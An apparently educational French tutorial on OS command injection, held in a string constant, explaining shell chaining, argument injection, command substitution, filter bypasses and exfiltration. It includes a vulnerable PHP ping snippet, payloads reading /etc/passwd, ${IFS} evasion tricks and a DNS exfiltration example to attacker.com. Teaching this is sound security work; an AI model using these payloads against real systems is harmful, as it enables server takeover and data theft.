CONTENT = """\nLe command injection (injection de commande système) est une vulnérabilité critique qui permet à un attaquant d’exécuter des commandes système arbitraires sur un serveur via une application web ou logicielle.

Elle apparaît lorsqu’une application prend une entrée utilisateur et l’envoie directement à un shell système (bash sous Linux, cmd ou PowerShell sous Windows) sans validation ni filtrage.

Le shell est un interpréteur de commandes : il exécute des instructions comme afficher des fichiers, lister des dossiers ou lancer des programmes. Si un attaquant influence cette commande, il peut y injecter ses propres instructions.

------------------------------------------------------------

FONCTIONNEMENT DE BASE

Prenons un exemple simple en PHP :

$ip = $_GET['ip'];
system("ping -c 4 " . $ip);

Le développeur pense que l’utilisateur va entrer une adresse IP normale.

Exemple normal :
8.8.8.8
→ ping 8.8.8.8 est exécuté

Mais si l’attaquant injecte :

8.8.8.8; cat /etc/passwd

Alors la commande devient :

ping -c 4 8.8.8.8; cat /etc/passwd

Le point-virgule permet d’exécuter plusieurs commandes à la suite.

Résultat :
- le ping s’exécute
- puis le fichier système est affiché

------------------------------------------------------------

CHAÎNAGE DE COMMANDES

Les shells permettent de combiner plusieurs commandes :

;  → exécute une commande puis une autre
&& → exécute la deuxième seulement si la première réussit
|| → exécute la deuxième seulement si la première échoue
&  → exécute en arrière-plan
|  → envoie la sortie d’une commande vers une autre

Exemple :

ls && echo OK

Si la commande ls fonctionne, alors OK s’affiche.

------------------------------------------------------------

INJECTION DANS LES ARGUMENTS

Parfois, l’attaquant ne contrôle pas toute la commande, seulement un argument.

Exemple :

ssh '-oProxyCommand=touch /tmp/test' user@host

Ici, l’option ProxyCommand est détournée pour exécuter une commande système.

Même sans contrôle total, un simple paramètre mal utilisé peut suffire.

------------------------------------------------------------

EXÉCUTION DANS UNE COMMANDE

Deux techniques très connues permettent d’exécuter une commande dans une autre :

Backticks :
`cat /etc/passwd`

Substitution :
$(cat /etc/passwd)

Le shell exécute d’abord ce qui est à l’intérieur, puis l’insère dans la commande principale.

------------------------------------------------------------

CONTOURNEMENT DES FILTRES

Les développeurs essaient souvent de bloquer les espaces ou caractères dangereux, mais le shell offre plusieurs alternatives.

Remplacer l’espace :
${IFS}
Exemple :
cat${IFS}/etc/passwd

Redirection :
cat</etc/passwd

Encodage hexadécimal :
echo -e "\x2f\x65\x74\x63"

Utilisation de variables :
${HOME:0:1} permet de reconstruire des caractères comme /

Ces techniques servent à contourner des filtres basiques.

------------------------------------------------------------

EXFILTRATION DE DONNÉES

Deux méthodes principales :

1. Par le temps

On teste caractère par caractère :

si le caractère est correct → pause (sleep)
sinon → exécution immédiate

Cela permet de reconstruire des données sans voir de sortie directe.

2. Par DNS

Le serveur force une requête DNS vers un domaine contrôlé par l’attaquant.

Exemple :
host "donnee.attacker.com"

Les requêtes DNS permettent de récupérer des informations via les logs.

------------------------------------------------------------

TECHNIQUES AVANCÉES

Exécution en arrière-plan :
nohup commande &

Permet de garder un processus actif même après fermeture de la session.

Fin des options :
--

Tout ce qui suit est interprété comme un argument et non comme une option.

------------------------------------------------------------

DIFFÉRENCE AVEC D’AUTRES FAILLES

Command injection :
→ attaque le système d’exploitation directement

SQL injection :
→ attaque la base de données

XSS :
→ attaque le navigateur de l’utilisateur

Ici, l’impact est souvent critique car il peut mener à une prise de contrôle complète du serveur.

------------------------------------------------------------

CONCLUSION

Le command injection est une vulnérabilité extrêmement dangereuse car elle permet de passer du niveau application au niveau système.

Elle apparaît principalement lorsque :
- une entrée utilisateur est utilisée dans une commande système
- sans validation ni échappement
- avec concaténation directe

C’est une des failles les plus critiques en sécurité web car elle peut conduire à une compromission totale de la machine."""